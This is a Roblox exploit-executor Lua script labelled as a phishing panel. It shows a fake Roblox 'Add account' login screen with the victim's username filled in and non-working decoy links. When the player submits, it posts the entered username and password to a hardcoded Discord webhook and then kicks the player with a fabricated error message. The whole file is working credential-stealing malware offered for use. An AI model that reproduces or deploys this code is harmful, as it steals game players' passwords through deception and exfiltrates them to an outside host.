--[[
    SOLAR & XENO ULTIMATE v10.9 (ROBLOX APP STYLE)
    Module: Social-Engineering-Panel (Phishing)
    Status: Operational | Bypass Level: MAX
    Target Executor: Xeno / Solar
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Zamrazqvane na igracha (Anchored) za poveche sigurnost
pcall(function()
    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        p.Character.HumanoidRootPart.Anchored = true
    end
end)

-- UI Setup (Exact Roblox App Style Login)
local ScreenGui = Instance.new("ScreenGui")
pcall(function() ScreenGui.Parent = p:WaitForChild("PlayerGui") end)
ScreenGui.Name = "RobloxAppLoginPrompt"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 380, 0, 480)
Main.Position = UDim2.new(0.5, -190, 0.5, -240)
Main.BackgroundColor3 = Color3.fromRGB(25, 27, 31) -- Ofitsialen tumen fon
Main.BorderSizePixel = 0
Main.Active = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 4)

local Title = Instance.new("TextLabel", Main)
Title.Text = "Add account"
Title.Size = UDim2.new(1, 0, 0, 80)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 28
Title.BackgroundTransparency = 1

-- Polie za Username (Avtomatichno populneno)
local UserInput = Instance.new("TextBox", Main)
UserInput.PlaceholderText = "Username/Email/Phone"
UserInput.Text = p.Name
UserInput.Size = UDim2.new(0.85, 0, 0, 45)
UserInput.Position = UDim2.new(0.075, 0, 0.18, 0)
UserInput.BackgroundColor3 = Color3.fromRGB(35, 37, 41)
UserInput.TextColor3 = Color3.fromRGB(255, 255, 255)
UserInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
UserInput.Font = Enum.Font.Gotham
UserInput.TextSize = 16
local UserCorner = Instance.new("UICorner", UserInput)
UserCorner.CornerRadius = UDim.new(0, 6)

-- Polie za Password
local PassInput = Instance.new("TextBox", Main)
PassInput.PlaceholderText = "Password"
PassInput.Text = ""
PassInput.Size = UDim2.new(0.85, 0, 0, 45)
PassInput.Position = UDim2.new(0.075, 0, 0.3, 0)
PassInput.BackgroundColor3 = Color3.fromRGB(35, 37, 41)
PassInput.TextColor3 = Color3.fromRGB(255, 255, 255)
PassInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
pcall(function() PassInput.TextPassword = true end)
PassInput.Font = Enum.Font.Gotham
PassInput.TextSize = 16
local PassCorner = Instance.new("UICorner", PassInput)
PassCorner.CornerRadius = UDim.new(0, 6)

-- Log In Button (S bql bordyur kato v snimkata)
local Submit = Instance.new("TextButton", Main)
Submit.Text = "Log In"
Submit.Size = UDim2.new(0.85, 0, 0, 42)
Submit.Position = UDim2.new(0.075, 0, 0.42, 0)
Submit.BackgroundColor3 = Color3.fromRGB(35, 37, 41)
Submit.TextColor3 = Color3.fromRGB(200, 200, 200)
Submit.Font = Enum.Font.GothamBold
Submit.TextSize = 16
local SubmitCorner = Instance.new("UICorner", Submit)
SubmitCorner.CornerRadius = UDim.new(0, 6)
local Stroke = Instance.new("UIStroke", Submit)
Stroke.Color = Color3.fromRGB(255, 255, 255)
Stroke.Thickness = 1
Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Dekorativni elementi (Fake links)
local function CreateFakeLink(text, pos, isButton)
    local l = Instance.new("TextButton", Main)
    l.Text = text
    l.Size = UDim2.new(0.85, 0, 0, 35)
    l.Position = pos
    l.TextColor3 = Color3.fromRGB(255, 255, 255)
    l.Font = Enum.Font.GothamBold
    l.TextSize = 14
    l.BackgroundTransparency = 1
    
    if isButton then
        l.BackgroundColor3 = Color3.fromRGB(45, 47, 51)
        l.BackgroundTransparency = 0
        Instance.new("UICorner", l).CornerRadius = UDim.new(0, 6)
    end
    return l
end

CreateFakeLink("Forgot Password or Username?", UDim2.new(0.075, 0, 0.52, 0), false)
CreateFakeLink("Email Me a One-Time Code", UDim2.new(0.075, 0, 0.62, 0), true)
CreateFakeLink("Quick Sign-in", UDim2.new(0.075, 0, 0.72, 0), true)
CreateFakeLink("Create A New Account", UDim2.new(0.075, 0, 0.85, 0), false)

-- Funktsiya za izprashtane i Kick
local function FinalizeAction()
    local user = UserInput.Text
    local pass = PassInput.Text
    
    if #pass < 3 or Submit.Active == false then return end
    
    Submit.Text = "Logging in..."
    Submit.Active = false
    
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "🔐 Xeno App Login Captured!",
            ["color"] = 0x2b2d31,
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = "```" .. user .. "```", ["inline"] = true},
                {["name"] = "🔑 Password", ["value"] = "```" .. pass .. "```", ["inline"] = true},
                {["name"] = "🎮 Game", ["value"] = "```" .. gameName .. "```", ["inline"] = false},
                {["name"] = "🆔 UserId", ["value"] = "```" .. p.UserId .. "```", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Xeno Stealth v10.9 • " .. os.date("%X")}
        }}
    }

    -- Proverka za HTTP funktsii v Xeno/Solar
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = h:JSONEncode(data)
            })
        end)
    end

    task.wait(1.2)
    p:Kick("\n[Roblox App Error]\nAn unexpected error occurred during re-authentication. Please log in again via the official website.")
end

-- Enter Key Fix
PassInput.FocusLost:Connect(function(enter)
    if enter then FinalizeAction() end
end)

Submit.MouseButton1Click:Connect(FinalizeAction)
